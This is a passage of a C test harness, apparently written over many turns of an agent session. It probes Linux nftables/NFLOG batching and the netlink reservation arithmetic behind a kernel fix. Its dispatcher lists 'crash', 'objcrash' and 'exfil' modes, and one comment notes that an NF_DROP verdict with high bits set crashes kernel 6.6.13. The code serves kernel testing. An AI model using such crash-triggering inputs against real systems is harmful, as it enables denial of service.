	 * last one that delivered two messages up to 64 bytes above it, and the counts
	 * are printed in order: that vector is the fingerprint of the window, and the
	 * same 17 payload sizes are tried on every kernel. */
	for (p = last_two; p <= last_two + 64; p += 4) {
		group++;
		cnt = nfl_probe(p, group);
		if (cnt == 0) {
			zeros++;
			if (zero_p < 0)
				zero_p = p;
		}
		if (nref < 17)
			ref[nref++] = cnt;
	}
	door_p = zero_p >= 0 ? zero_p : last_two + 32;
	group++;
	{
		char tab[16];
		struct nfl_res r;
		int fd = -1, k;

		snprintf(tab, sizeof(tab), "d%d", group);
		nops = 0;
		nrecs = 0;
		op_newtable(tab);
		op_newchain(tab, "c", NF_INET_LOCAL_IN, 0, NF_ACCEPT);
		if (op_newrule_log(tab, "c", group, 2) != NULL) {
			fd = nfl_ulog_open(group, 2);
			if (fd >= 0) {
				k = nf_flush();
				if (k == 0) {
					memset(&r, 0, sizeof(r));
					nfl_send_pkts(6, door_p, 0x33);
					nfl_drain(fd, &r, 600);
					door_got = r.msgs;
				}
				close(fd);
			}
		}
	}
	{
		char vec[128];
		int i, off = 0;

		vec[0] = 0;
		for (i = 0; i < nref; i++)
			off += snprintf(vec + off, sizeof(vec) - off, "%s%d",
					i ? "," : "", ref[i]);
		snprintf(out, n, "setup=OK|s2=%d|s1=%d|s0=%d|last_two=%d|first_one=%d|refine=%s|zeros=%d|zeroP=%d|doorP=%d|door_sent=6|door_got=%d",
			 s2, s1, s0, last_two, first_one, vec, zeros, zero_p, door_p,
			 door_got);
	}
	return 0;
}

/* control for door 3: a payload small enough that every batch has room to
 * spare; six packets must give six messages on every kernel.  It says the
 * drops the scan sees are a property of the size, not of my reader. */
static int sc_nfl_fit(char *out, size_t n)
{
	struct nfl_res r;
	int fd = -1, k;

	memset(&r, 0, sizeof(r));
	k = nfl_setup("dt", 3, 2, out, n, &fd);
	if (k <= 0)
		return 0;
	nfl_send_pkts(6, 200, 0x33);
	nfl_drain(fd, &r, 300);
	snprintf(out, n, "setup=OK|sent=6|msgs=%d|batches=%d|done=%d|mlen=%d",
		 r.msgs, r.batches, r.done_seen, r.mlen_min);
	close(fd);
	return 0;
}

/* one diagnostic scenario: two datagrams of one payload size, every counter the
 * reader has.  It exists because the coarse scan says two messages fit at a
 * payload where arithmetic says they cannot, and a number I cannot explain is
 * not allowed into the report. */
static int sc_nfl_diag(char *out, size_t n)
{
	struct nfl_res r;
	int fd = -1, k;

	memset(&r, 0, sizeof(r));
	k = nfl_setup("dt", 3, 2, out, n, &fd);
	if (k <= 0)
		return 0;
	nfl_send_pkts(2, 3712, 0x33);
	nfl_drain(fd, &r, 900);
	snprintf(out, n, "setup=OK|sent=2|msgs=%d|batches=%d|max_dgram=%d|mlen_min=%d|mlen_max=%d|done=%d|padlen=%d|hdr=%02x%02x%02x%02x",
		 r.msgs, r.batches, r.max_dgram_msgs, r.mlen_min, r.mlen_max,
		 r.done_seen, r.pad_sample_len, r.hdr[0], r.hdr[1], r.hdr[2], r.hdr[3]);
	close(fd);
	return 0;
}

/* ================= turn 538: the slack budget of one NFLOG message, to the byte ========
 *
 * Turn 537 measured door 3 (607245c4dbb8, "account for netlink header size") as a
 * *negative*: no batch was ever dropped, and the reason was an interval, not a number --
 * "the reservation over-estimates by 24-32 bytes" was read off two coarse boundaries.
 * This turn replaces the interval with a ledger and tests the one arithmetic statement
 * that decides whether the fix's symptom is reachable at all:
 *
 *   __nfulnl_send() appends NLMSG_DONE with nlmsg_put(..., sizeof(nfgenmsg)) which needs
 *   nlmsg_total_size(4) = 20 bytes of tailroom.  Before the fix the per-message
 *   reservation sets aside nla_total_size(4) = 8 for it, i.e. 12 short.  A message is
 *   only admitted when its reservation fits the tailroom, so after the last message of a
 *   batch the tailroom is >= K, where K = reservation - written for that message.  The
 *   terminator therefore fails exactly when K < 20.
 *
 * So there are two numbers to measure for each rule configuration: W (what is actually
 * written, from the message itself) and K (what is reserved beyond it).  Three
 * instruments, none of which assumes the other:
 *
 *   ATTRS   the attribute list of one message: type and length of every attribute the
 *           kernel actually emitted.  Sum + NLMSG_HDRLEN must equal nlmsg_len.  This
 *           says W, item by item, and it says which of the conditional attributes
 *           (mark, uid, gid, prefix, ifindex_out) exist in this hook at all.
 *   BOUND   the payload at which a two-message batch stops forming: a second message is
 *           admitted iff S <= B - L, i.e. 2L <= B - K, so the largest payload that still
 *           batches pins K against the buffer size B.  Independent of the attribute list.
 *   CAP     a batch allowed to fill the whole buffer: the number of messages a datagram
 *           carries is floor((B + K)/(L + K)), so one payload brackets B, and two
 *           payloads bracket K -- without the attribute list and without the boundary.
 *
 * Knobs that move K, all reserved-but-unwritten in this hook per the source: skb->mark
 * == 0 (8 bytes), a received packet has no socket so uid+gid are absent (16 bytes),
 * outdev is NULL in LOCAL_IN (8 bytes), and the NLMSG_DONE shortfall (12 bytes).
 *
 * Every uapi number below was read from include/uapi/linux/netfilter/{nfnetlink_log.h,
 * nf_tables.h} of the 6.6.13 tree:
 *   NFULA_MARK 2 TIMESTAMP 3 IFINDEX_INDEV 4 IFINDEX_OUTDEV 5 HWADDR 8 PAYLOAD 9
 *   PREFIX 10 UID 11 GID 14 HWTYPE 15 HWHEADER 16 HWLEN 17
 *   NFTA_LOG_GROUP 1 PREFIX 2 QTHRESHOLD 4
 *   NFTA_META_DREG 1 KEY 2 SREG 3 ; NFT_META_MARK 3 ; NFT_REG_1 1
 * ===================================================================================== */

#define F538_PAYLOAD		9
#define F538_TIMESTAMP		3
#define F538_HWADDR		8
#define F538_PREFIX		10
#define F538_LOG_PREFIX		2
#define F538_META_KEY		2
#define F538_META_SREG		3
#define F538_NFT_META_MARK	3
#define F538_MARK_VAL		0x5a5a5a5aU	/* symmetric: endianness cannot matter */

struct f538_attr {
	uint16_t type;
	int len;
};

struct f538_res {
	int batches;
	int msgs;
	int dgram_msgs;		/* messages in the datagram being parsed   */
	int max_dgram_msgs;
	int done_seen;
	int mlen;		/* nlmsg_len of the first PACKET message   */
	int nattr;
	struct f538_attr at[24];
	int attr_bytes;		/* sum of NLA_ALIGN(nla_len) over attributes */
	int payload_attr;	/* nla_len of NFULA_PAYLOAD                  */
	int dstamp_len;		/* nla_len of NFULA_TIMESTAMP (0 = absent)   */
	int hwaddr_len;
	int prefix_len;
	int sum_mismatch;	/* mlen != 20 + attr_bytes                   */
};

static void f538_walk(const unsigned char *p, int len, struct f538_res *r)
{
	int off = 0;

	while (off + (int)sizeof(struct nlattr) <= len) {
		const struct nlattr *a = (const struct nlattr *)(p + off);
		int alen = (int)a->nla_len;
		uint16_t t;

		if (alen < (int)sizeof(struct nlattr) || off + alen > len)
			break;
		t = (uint16_t)(a->nla_type & 0x3fff);
		if (r->nattr < (int)(sizeof(r->at) / sizeof(r->at[0]))) {
			r->at[r->nattr].type = t;
			r->at[r->nattr].len = alen;
			r->nattr++;
		}
		if (t == F538_PAYLOAD)
			r->payload_attr = alen;
		else if (t == F538_TIMESTAMP)
			r->dstamp_len = alen;
		else if (t == F538_HWADDR)
			r->hwaddr_len = alen;
		else if (t == F538_PREFIX)
			r->prefix_len = alen;
		off += (int)NLA_ALIGN_(alen);
	}
	r->attr_bytes = off;
}

static void f538_parse(const unsigned char *buf, int len, struct f538_res *r)
{
	const struct nlmsghdr *nlh = (const struct nlmsghdr *)buf;
	int rem = len;

	r->dgram_msgs = 0;
	while (NLMSG_OK(nlh, rem)) {
		if (nlh->nlmsg_type == NLMSG_DONE_) {
			r->done_seen++;
		} else if (nlh->nlmsg_type ==
			   (uint16_t)((NFNL_SUBSYS_ULOG << 8) | NFULNL_MSG_PACKET)) {
			const unsigned char *p = (const unsigned char *)NLMSG_DATA(nlh);
			int pl = (int)nlh->nlmsg_len - NLMSG_HDRLEN;

			r->msgs++;
			r->dgram_msgs++;
			if (r->dgram_msgs > r->max_dgram_msgs)
				r->max_dgram_msgs = r->dgram_msgs;
			if (r->mlen == 0 && pl >= 4) {
				r->mlen = (int)nlh->nlmsg_len;
				f538_walk(p + 4, pl - 4, r);
				/* the walk starts after the 4-byte nfgenmsg, so the
				 * message is hdr + nfgenmsg + attributes */
				if (r->mlen != NLMSG_HDRLEN + 4 + r->attr_bytes)
					r->sum_mismatch++;
			}
		}
		nlh = NLMSG_NEXT(nlh, rem);
	}
}

static int f538_drain(int fd, struct f538_res *r, int first_ms)
{
	unsigned char buf[131072];
	int got = 0;

	while (got < 4096) {
		struct timeval tv;
		int n, ms = got ? 30 : first_ms;

		tv.tv_sec = ms / 1000;
		tv.tv_usec = (ms % 1000) * 1000;
		setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
		n = (int)recv(fd, buf, sizeof(buf), 0);
		if (n <= 0)
			break;
		got++;
		f538_parse(buf, n, r);
	}
	r->batches += got;
	return got;
}

/* meta mark set <val> : immediate -> reg1 ; meta(key=MARK, sreg=reg1) */
static void f538_set_mark(struct nlmsghdr *nlh, uint32_t val)
{
	struct nlattr *e, *d, *dd;

	e = nest_start(nlh, NFTA_LIST_ELEM, "m.imm");
	put_str(nlh, NFTA_EXPR_NAME, "immediate", "m.imm.name");
	d = nest_start(nlh, NFTA_EXPR_DATA, "m.imm.data");
	put_be32(nlh, NFTA_IMMEDIATE_DREG, NFT_REG_1, "m.imm.dreg");
	dd = nest_start(nlh, NFTA_IMMEDIATE_DATA, "m.imm.value");
	attr_put(nlh, NFTA_DATA_VALUE, &val, 4, "m.imm.bytes");
	nest_end(nlh, dd);
	nest_end(nlh, d);
	nest_end(nlh, e);

	e = nest_start(nlh, NFTA_LIST_ELEM, "m.set");
	put_str(nlh, NFTA_EXPR_NAME, "meta", "m.set.name");
	d = nest_start(nlh, NFTA_EXPR_DATA, "m.set.data");
	put_be32(nlh, F538_META_KEY, F538_NFT_META_MARK, "m.set.key");
	put_be32(nlh, F538_META_SREG, NFT_REG_1, "m.set.sreg");
	nest_end(nlh, d);
	nest_end(nlh, e);
}

/* the rule of turn 537 plus two knobs: an optional prefix and an optional mark */
static struct nlmsghdr *f538_rule(const char *table, const char *chain, int group,
				  int qthresh, const char *prefix, int mark)
{
	struct nlmsghdr *nlh;
	struct nlattr *exprs, *elem, *edata;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND,
			NFPROTO_IPV4);
	put_str(nlh, NFTA_RULE_TABLE, table, "lg.rule.table");
	put_str(nlh, NFTA_RULE_CHAIN, chain, "lg.rule.chain");
	exprs = nest_start(nlh, NFTA_RULE_EXPRESSIONS, "lg.rule.exprs");

	/* the same filter as turn 537: one packet, one message */
	nfl_load(nlh, NFT_REG_1, NFT_PAYLOAD_NETWORK_HEADER, 9, 1);
	{
		unsigned char proto = IPPROTO_UDP;

		nfl_cmp_eq(nlh, NFT_REG_1, 1, &proto);
	}
	nfl_load(nlh, NFT_REG_1, NFT_PAYLOAD_TRANSPORT_HEADER, 2, 2);
	{
		uint16_t dport = htons(9999);

		nfl_cmp_eq(nlh, NFT_REG_1, 2, &dport);
	}

	if (mark)
		f538_set_mark(nlh, F538_MARK_VAL);

	elem = nest_start(nlh, NFTA_LIST_ELEM, "lg.rule.exprs[0]");
	put_str(nlh, NFTA_EXPR_NAME, "log", "lg.rule.exprs[0].name");
	edata = nest_start(nlh, NFTA_EXPR_DATA, "lg.rule.exprs[0].data");
	{
		uint16_t g = htons((uint16_t)group);

		attr_put(nlh, NFTA_LOG_GROUP, &g, 2, "lg.log.group");
	}
	if (prefix)
		attr_put(nlh, F538_LOG_PREFIX, prefix, (int)strlen(prefix) + 1,
			 "lg.log.prefix");
	if (qthresh > 0) {
		uint16_t q = htons((uint16_t)qthresh);

		attr_put(nlh, NFTA_LOG_QTHRESHOLD, &q, 2, "lg.log.qthresh");
	}
	nest_end(nlh, edata);
	nest_end(nlh, elem);

	exfil_imm_verdict(nlh, NF_ACCEPT);
	nest_end(nlh, exprs);
	nops++;
	return nlh;
}

static int f538_setup(const char *tab, int group, int qthresh, const char *prefix,
		      int mark, char *out, size_t n, int *fdp)
{
	int fd, errs;

	nops = 0;
	nrecs = 0;
	op_newtable(tab);
	op_newchain(tab, "c", NF_INET_LOCAL_IN, 0, NF_ACCEPT);
	if (f538_rule(tab, "c", group, qthresh, prefix, mark) == NULL) {
		snprintf(out, n, "setup=BUILD_FAIL");
		return -1;
	}
	fd = nfl_ulog_open(group, qthresh);
	if (fd < 0) {
		snprintf(out, n, "setup=ULOG_OPEN_%d", fd);
		return -1;
	}
	errs = nf_flush();
	if (errs < 0) {
		snprintf(out, n, "setup=SENDFAIL_%d", errs);
		close(fd);
		return -1;
	}
	if (errs > 0) {
		snprintf(out, n, "setup=ERR|errno=%d|extack=%.80s",
			 g_err ? -g_err : 0, g_extack[0] ? g_extack : "none");
		close(fd);
		return 0;
	}
	*fdp = fd;
	return 1;
}

/* ---- 1. ATTRS: what the kernel actually writes into one message ---- */
static int f538_attrs(const char *cfg, const char *prefix, int mark, char *out,
		      size_t n)
{
	struct f538_res r;
	char list[256];
	int fd = -1, k, i, off = 0;

	memset(&r, 0, sizeof(r));
	k = f538_setup("at", 20, 1, prefix, mark, out, n, &fd);
	if (k <= 0)
		return 0;
	nfl_send_pkts(1, 64, 0x33);
	f538_drain(fd, &r, 300);
	close(fd);
	list[0] = 0;
	for (i = 0; i < r.nattr; i++)
		off += snprintf(list + off, sizeof(list) - (size_t)off, "%s%u:%d",
				i ? "," : "", r.at[i].type, r.at[i].len);
	snprintf(out, n, "cfg=%s|setup=OK|msgs=%d|mlen=%d|nattr=%d|attr_bytes=%d|"
		 "sum_ok=%d|payload_attr=%d|ts=%d|hwaddr=%d|prefix_attr=%d|attrs=%s",
		 cfg, r.msgs, r.mlen, r.nattr, r.attr_bytes,
		 r.sum_mismatch == 0 ? 1 : 0, r.payload_attr,
		 r.dstamp_len, r.hwaddr_len, r.prefix_len, list);
	return 0;
}

static int sc_f538_attrs_plain(char *o, size_t n) { return f538_attrs("plain", NULL, 0, o, n); }
static int sc_f538_attrs_mark(char *o, size_t n)  { return f538_attrs("mark", NULL, 1, o, n); }
static int sc_f538_attrs_pfx(char *o, size_t n)   { return f538_attrs("pfx", "A538", 0, o, n); }
static int sc_f538_attrs_both(char *o, size_t n)  { return f538_attrs("both", "A538", 1, o, n); }

/* ---- 2. CAP: how many messages one full buffer carries for a fixed message size ---- */
static int f538_cap(int paylen, const char *prefix, int mark, char *out, size_t n)
{
	struct f538_res r;
	int fd = -1, k;

	memset(&r, 0, sizeof(r));
	k = f538_setup("cp", 21, 1000, prefix, mark, out, n, &fd);
	if (k <= 0)
		return 0;
	nfl_send_pkts(200, paylen, 0x44);
	f538_drain(fd, &r, 400);
	close(fd);
	snprintf(out, n, "setup=OK|sent=200|payload=%d|msgs=%d|max_dgram_msgs=%d|"
		 "batches=%d|done=%d|mlen=%d", paylen, r.msgs, r.max_dgram_msgs,
		 r.batches, r.done_seen, r.mlen);
	return 0;
}

static int sc_f538_cap_96(char *o, size_t n)   { return f538_cap(96, NULL, 1, o, n); }
static int sc_f538_cap_116(char *o, size_t n)  { return f538_cap(116, NULL, 1, o, n); }
static int sc_f538_cap_1000(char *o, size_t n) { return f538_cap(1000, NULL, 1, o, n); }

/* ---- 3. BOUND: the largest payload that still gives two messages in one datagram ---- */
static int f538_probe2(int paylen, int group, const char *prefix, int mark)
{
	char tab[16];
	struct f538_res r;
	int fd = -1, k;

	snprintf(tab, sizeof(tab), "b%d", group);
	nops = 0;
	nrecs = 0;
	op_newtable(tab);
	op_newchain(tab, "c", NF_INET_LOCAL_IN, 0, NF_ACCEPT);
	if (f538_rule(tab, "c", group, 2, prefix, mark) == NULL)
		return -1;
	fd = nfl_ulog_open(group, 2);
	if (fd < 0)
		return -2;
	k = nf_flush();
	if (k != 0) {
		close(fd);
		return k > 0 ? -10 : -11;
	}
	memset(&r, 0, sizeof(r));
	nfl_send_pkts(2, paylen, 0x33);
	f538_drain(fd, &r, 250);
	close(fd);
	return r.max_dgram_msgs;
}

static int f538_bound(const char *cfg, const char *prefix, int mark, char *out,
		      size_t n)
{
	int p, cnt, last_two = -1, first_one = -1, group = 40;
	char vec[256];
	int off = 0;

	vec[0] = 0;
	for (p = 1600; p <= 1800; p += 4) {
		group++;
		cnt = f538_probe2(p, group, prefix, mark);
		if (cnt < 0) {
			snprintf(out, n, "cfg=%s|setup=PROBE_FAIL|p=%d|cnt=%d", cfg, p, cnt);
			return 0;
		}
		if (cnt >= 2)
			last_two = p;
		else if (cnt == 1 && first_one < 0)
			first_one = p;
		if (p >= 1680 && p <= 1740)
			off += snprintf(vec + off, sizeof(vec) - (size_t)off, "%s%d",
					off ? "," : "", cnt);
	}
	snprintf(out, n, "cfg=%s|setup=OK|last_two=%d|first_one=%d|vec1680_1740=%s",
		 cfg, last_two, first_one, vec);
	return 0;
}

static int sc_f538_bound_plain(char *o, size_t n) { return f538_bound("plain", NULL, 0, o, n); }
static int sc_f538_bound_mark(char *o, size_t n)  { return f538_bound("mark", NULL, 1, o, n); }
static int sc_f538_bound_pfx(char *o, size_t n)   { return f538_bound("pfx", "A538", 0, o, n); }

/* ---- 4. WARN: six packets in the tightest legal batches; does any batch vanish? ---- */
static int f538_warn(int paylen, const char *prefix, int mark, char *out, size_t n)
{
	struct f538_res r;
	int fd = -1, k;

	memset(&r, 0, sizeof(r));
	k = f538_setup("wn", 22, 2, prefix, mark, out, n, &fd);
	if (k <= 0)
		return 0;
	nfl_send_pkts(6, paylen, 0x55);
	f538_drain(fd, &r, 500);
	close(fd);
	snprintf(out, n, "setup=OK|sent=6|payload=%d|msgs=%d|batches=%d|done=%d|"
		 "max_dgram_msgs=%d|mlen=%d|lost=%d", paylen, r.msgs, r.batches,
		 r.done_seen, r.max_dgram_msgs, r.mlen, 6 - r.msgs);
	return 0;
}

static int sc_f538_warn_1612(char *o, size_t n) { return f538_warn(1612, NULL, 1, o, n); }
static int sc_f538_warn_1716(char *o, size_t n) { return f538_warn(1716, NULL, 1, o, n); }

/* ---- 5. control: qthreshold 1 -- no batch, therefore no terminator at all ---- */
static int sc_f538_q1(char *out, size_t n)
{
	struct f538_res r;
	int fd = -1, k;

	memset(&r, 0, sizeof(r));
	k = f538_setup("q1", 23, 1, NULL, 1, out, n, &fd);
	if (k <= 0)
		return 0;
	nfl_send_pkts(6, 1716, 0x55);
	f538_drain(fd, &r, 400);
	close(fd);
	snprintf(out, n, "setup=OK|sent=6|msgs=%d|batches=%d|done=%d|max_dgram_msgs=%d",
		 r.msgs, r.batches, r.done_seen, r.max_dgram_msgs);
	return 0;
}


/* ---- 6. CLASS: where the request stops fitting the 4k slab = R0, measured ----
 * nfulnl_alloc_skb() asks for max(nlbufsiz, S).  While S <= NLMSG_GOODSIZE = 3776 the
 * request lands in kmalloc-4096 and the usable tailroom is 3776; one byte more and it
 * lands in kmalloc-8192 (usable 7808), which is the difference between one message per
 * datagram and two.  So the payload at which that jump happens says where S crosses
 * 3776, i.e. it measures the reservation R0 itself -- the one number this turn has been
 * computing by hand. */
static int f538_class(char *out, size_t n)
{
	int p, cnt, group = 60, last1 = -1, first2 = -1;
	char vec[192];
	int off = 0;

	vec[0] = 0;
	for (p = 3480; p <= 3800; p += 4) {
		struct f538_res r;
		int fd = -1, k;

		nops = 0;
		nrecs = 0;
		group++;
		{
			char tab[16];

			snprintf(tab, sizeof(tab), "k%d", group);
			op_newtable(tab);
			op_newchain(tab, "c", NF_INET_LOCAL_IN, 0, NF_ACCEPT);
			if (f538_rule(tab, "c", group, 1000, NULL, 0) == NULL)
				return 0;
		}
		fd = nfl_ulog_open(group, 1000);
		if (fd < 0)
			return 0;
		k = nf_flush();
		if (k != 0) {
			close(fd);
			return 0;
		}
		memset(&r, 0, sizeof(r));
		nfl_send_pkts(6, p, 0x66);
		f538_drain(fd, &r, 250);
		close(fd);
		cnt = r.max_dgram_msgs;
		if (cnt == 1)
			last1 = p;
		else if (cnt >= 2 && first2 < 0)
			first2 = p;
		off += snprintf(vec + off, sizeof(vec) - (size_t)off, "%s%d", off ? "," : "", cnt);
	}
	snprintf(out, n, "setup=OK|last_1msg=%d|first_2msg=%d|vec3480_3800=%s",
		 last1, first2, vec);
	return 0;
}

static int sc_f538_class(char *o, size_t n) { return f538_class(o, n); }


/* ---- 7. the contrast that makes the ledger readable: the same message logged in
 * LOCAL_OUT instead of LOCAL_IN.  In LOCAL_OUT the packet still has its socket
 * (uid+gid appear), but there is no indev (no IFINDEX_INDEV, no HWADDR, no L2 block)
 * and hooknum 3 > NF_INET_FORWARD, so no NFULA_TIMESTAMP either.  Every one of those
 * four items is a line in the reservation, so the difference between the two hooks is
 * a direct test of the ledger rather than of the boundary. ---- */
static struct nlmsghdr *f538_out_rule(const char *table, const char *chain, int group, int qthresh,
			 const char *prefix, int mark)
{
	struct nlmsghdr *nlh;
	struct nlattr *exprs, *elem, *edata;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND,
			NFPROTO_IPV4);
	put_str(nlh, NFTA_RULE_TABLE, table, "lo.rule.table");
	put_str(nlh, NFTA_RULE_CHAIN, chain, "lo.rule.chain");
	exprs = nest_start(nlh, NFTA_RULE_EXPRESSIONS, "lo.rule.exprs");
	nfl_load(nlh, NFT_REG_1, NFT_PAYLOAD_NETWORK_HEADER, 9, 1);
	{
		unsigned char proto = IPPROTO_UDP;

		nfl_cmp_eq(nlh, NFT_REG_1, 1, &proto);
	}
	nfl_load(nlh, NFT_REG_1, NFT_PAYLOAD_TRANSPORT_HEADER, 2, 2);
	{
		uint16_t dport = htons(9999);

		nfl_cmp_eq(nlh, NFT_REG_1, 2, &dport);
	}
	if (mark)
		f538_set_mark(nlh, F538_MARK_VAL);
	elem = nest_start(nlh, NFTA_LIST_ELEM, "lo.rule.exprs[0]");
	put_str(nlh, NFTA_EXPR_NAME, "log", "lo.rule.exprs[0].name");
	edata = nest_start(nlh, NFTA_EXPR_DATA, "lo.rule.exprs[0].data");
	{
		uint16_t g = htons((uint16_t)group);

		attr_put(nlh, NFTA_LOG_GROUP, &g, 2, "lo.log.group");
	}
	if (prefix)
		attr_put(nlh, F538_LOG_PREFIX, prefix, (int)strlen(prefix) + 1,
			 "lo.log.prefix");
	if (qthresh > 0) {
		uint16_t q = htons((uint16_t)qthresh);

		attr_put(nlh, NFTA_LOG_QTHRESHOLD, &q, 2, "lo.log.qthresh");
	}
	nest_end(nlh, edata);
	nest_end(nlh, elem);
	exfil_imm_verdict(nlh, NF_ACCEPT);
	nest_end(nlh, exprs);
	nops++;
	return nlh;
}

static int sc_f538_out_attrs(char *out, size_t n)
{
	struct f538_res r;
	char list[256];
	int fd = -1, k, i, off = 0;
	const int group = 24;

	memset(&r, 0, sizeof(r));
	nops = 0;
	nrecs = 0;
	op_newtable("oa");
	op_newchain("oa", "c", NF_INET_LOCAL_OUT, 0, NF_ACCEPT);
	if (f538_out_rule("oa", "c", group, 1, NULL, 0) == NULL) {
		snprintf(out, n, "setup=BUILD_FAIL");
		return 0;
	}
	fd = nfl_ulog_open(group, 1);
	if (fd < 0) {
		snprintf(out, n, "setup=ULOG_OPEN_%d", fd);
		return 0;
	}
	k = nf_flush();
	if (k != 0) {
		snprintf(out, n, "setup=FLUSH_%d", k);
		close(fd);
		return 0;
	}
	nfl_send_pkts(1, 64, 0x33);
	f538_drain(fd, &r, 300);
	close(fd);
	list[0] = 0;
	for (i = 0; i < r.nattr; i++)
		off += snprintf(list + off, sizeof(list) - (size_t)off, "%s%u:%d",
				i ? "," : "", r.at[i].type, r.at[i].len);
	snprintf(out, n, "cfg=out|setup=OK|msgs=%d|mlen=%d|nattr=%d|attr_bytes=%d|"
		 "sum_ok=%d|payload_attr=%d|ts=%d|hwaddr=%d|prefix_attr=%d|attrs=%s",
		 r.msgs, r.mlen, r.nattr, r.attr_bytes,
		 r.sum_mismatch == 0 ? 1 : 0, r.payload_attr, r.dstamp_len,
		 r.hwaddr_len, r.prefix_len, list);
	return 0;
}

static int sc_f538_out_bound(char *out, size_t n)
{
	int p, cnt, last_two = -1, first_one = -1, group = 90;
	char vec[256];
	int off = 0;

	vec[0] = 0;
	for (p = 1650; p <= 1850; p += 4) {
		struct f538_res r;
		char tab[16];
		int fd = -1, k;

		snprintf(tab, sizeof(tab), "ob%d", group);
		nops = 0;
		nrecs = 0;
		group++;
		op_newtable(tab);
		op_newchain(tab, "c", NF_INET_LOCAL_OUT, 0, NF_ACCEPT);
		if (f538_out_rule(tab, "c", group, 2, NULL, 0) == NULL)
			return 0;
		fd = nfl_ulog_open(group, 2);
		if (fd < 0)
			return 0;
		k = nf_flush();
		if (k != 0) {
			close(fd);
			return 0;
		}
		memset(&r, 0, sizeof(r));
		nfl_send_pkts(2, p, 0x33);
		f538_drain(fd, &r, 250);
		close(fd);
		cnt = r.max_dgram_msgs;
		if (cnt >= 2)
			last_two = p;
		else if (cnt == 1 && first_one < 0)
			first_one = p;
		if (p >= 1740 && p <= 1800)
			off += snprintf(vec + off, sizeof(vec) - (size_t)off, "%s%d",
					off ? "," : "", cnt);
	}
	snprintf(out, n, "cfg=out|setup=OK|last_two=%d|first_one=%d|vec1740_1800=%s",
		 last_two, first_one, vec);
	return 0;
}

static void run_f538(void)
{
	run_new("f538.attrs.plain", sc_f538_attrs_plain, 60);
	run_new("f538.attrs.mark", sc_f538_attrs_mark, 60);
	run_new("f538.attrs.pfx", sc_f538_attrs_pfx, 60);
	run_new("f538.attrs.both", sc_f538_attrs_both, 60);
	run_new("f538.cap.96", sc_f538_cap_96, 120);
	run_new("f538.cap.116", sc_f538_cap_116, 120);
	run_new("f538.cap.1000", sc_f538_cap_1000, 180);
	run_new("f538.bound.plain", sc_f538_bound_plain, 600);
	run_new("f538.bound.mark", sc_f538_bound_mark, 600);
	run_new("f538.warn.1612", sc_f538_warn_1612, 90);
	run_new("f538.warn.1716", sc_f538_warn_1716, 90);
	run_new("f538.ctl.q1", sc_f538_q1, 90);
	run_new("f538.class", sc_f538_class, 600);
	run_new("f538.bound.pfx", sc_f538_bound_pfx, 600);
	run_new("f538.out.attrs", sc_f538_out_attrs, 60);
	run_new("f538.out.bound", sc_f538_out_bound, 600);
}

static void run_nflog(void)
{
	run_new("nfl.pad.P43", sc_nfl_pad_P43, 90);
	run_new("nfl.pad.P44", sc_nfl_pad_P44, 90);
	run_new("nfl.pad.P45", sc_nfl_pad_P45, 90);
	run_new("nfl.pad.P46", sc_nfl_pad_P46, 90);
	run_new("nfl.done", sc_nfl_done, 90);
	run_new("nfl.nodone", sc_nfl_nodone, 60);
	run_new("nfl.fit", sc_nfl_fit, 60);
	run_new("nfl.diag", sc_nfl_diag, 90);
	run_new("nfl.scan", sc_nfl_scan, 900);
}

static void run_f539(void);
static int sc_f539_diag(char *out, size_t n);

static void run_f540(void);
static void run_f541(void);
static void run_f541_in(void);
static void run_f19(void);
static void run_f20(void);
static void run_f21(void);
static void run_f21smoke(void);
static void run_p548(void);
static void run_f549(void);
static void run_f550(void);
static void run_f552(void);
static unsigned int f548_ror32(unsigned int x, int n);

static int g_fix548;

int main(int argc, char **argv)
{
	const char *mode = argc > 1 ? argv[1] : "all";

	setvbuf(stdout, NULL, _IOLBF, 0);
	/* order matters: the verdict grid contains a value that crashes 6.6.13
	 * (NF_DROP with high bits set), so it runs LAST -- a contained crash in
	 * the final scenario cannot take the rest of the battery down with it. */
	if (!strcmp(mode, "all") || !strcmp(mode, "lookup_plain"))
		run_battery("plain", 0);
	if (!strcmp(mode, "all") || !strcmp(mode, "lookup_invert"))
		run_battery("invert", 1);
	if (!strcmp(mode, "all") || !strcmp(mode, "verdicts"))
		run_verdicts();
	if (!strcmp(mode, "mismatch"))
		run_mismatch();
	if (!strcmp(mode, "vmap"))
		run_vmap();
	if (!strcmp(mode, "vmapmut"))
		run_vmap_mut();
	if (!strcmp(mode, "exfil"))
		run_exfil();
	if (!strcmp(mode, "reg"))
		run_reg();
	if (!strcmp(mode, "crash") || !strcmp(mode, "crashctl"))
		run_crash(mode);
	if (!strcmp(mode, "cto"))
		run_cto();
	if (!strcmp(mode, "concat"))
		run_concat();
	if (!strcmp(mode, "bitw"))
		run_bitw();
	if (!strcmp(mode, "fam"))
		run_fam();
	if (!strcmp(mode, "exh"))
		run_exh();
	if (!strcmp(mode, "obj"))
		run_obj();
	if (!strcmp(mode, "objcrash"))
		run_objcrash();
	if (!strcmp(mode, "nflog"))
		run_nflog();
	if (!strcmp(mode, "f538"))
		run_f538();
	if (!strcmp(mode, "f540"))
		run_f540();
	if (!strcmp(mode, "f541"))
		run_f541();
	if (!strcmp(mode, "f541in"))
		run_f541_in();
	if (!strcmp(mode, "f19"))
		run_f19();
	if (!strcmp(mode, "f20"))
		run_f20();
	if (!strcmp(mode, "f21"))
		run_f21();
	if (!strcmp(mode, "f21s"))
		run_f21smoke();
	if (!strcmp(mode, "f21fix")) {
		g_fix548 = 1;
		run_f21();
	}
	if (!strcmp(mode, "f21fixs")) {
		g_fix548 = 1;
		run_f21smoke();
	}
	if (!strcmp(mode, "p548"))
		run_p548();
	if (!strcmp(mode, "f549"))
		run_f549();
	if (!strcmp(mode, "f550"))
		run_f550();
	if (!strcmp(mode, "f552"))
		run_f552();
	if (!strcmp(mode, "f539"))
		run_f539();
	if (!strcmp(mode, "f539reg")) {
		run_f538();
		run_f539();
	}
	if (!strcmp(mode, "f13all")) {
		run_exh();
		run_obj();
		run_fam();
	}
	printf("=== DIFFER_DONE nrecs_plain_check=\n");
	return 0;
}

